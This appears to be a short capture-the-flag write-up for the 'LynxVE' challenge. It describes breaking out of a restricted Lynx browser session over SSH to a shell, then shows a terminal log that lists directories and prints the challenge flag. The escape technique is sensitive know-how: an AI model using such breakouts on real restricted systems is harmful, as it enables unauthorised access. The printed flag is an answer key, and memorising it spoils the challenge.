# LynxVE writeup

After connecting by ssh we are redirected to the Lynx text app... So we should escape from it by pressing the Esc + :! key to spawn the shell:
```
burgos1337@burgos1337-VirtualBox:~/Desktop$ ssh ctf@lynxve.wpictf.xyz
Password: 
Spawning your default shell.  Use 'exit' to return to Lynx.

sh-5.0$ ls
bin  boot  dev	etc  home  lib	lib64  mnt  opt  proc  root  run  sbin	srv  sys  tmp  usr  var
sh-5.0$ cd home
sh-5.0$ ls
ctf
sh-5.0$ cd ctf
sh-5.0$ ls
flag
sh-5.0$ cat flag
WPI{lynX_13_Gr8or_Th@n_Chr0m1Um}
sh-5.0$ ^C
sh-5.0$ exit
Connection to lynxve.wpictf.xyz closed.
burgos1337@burgos1337-VirtualBox:~/Desktop$
```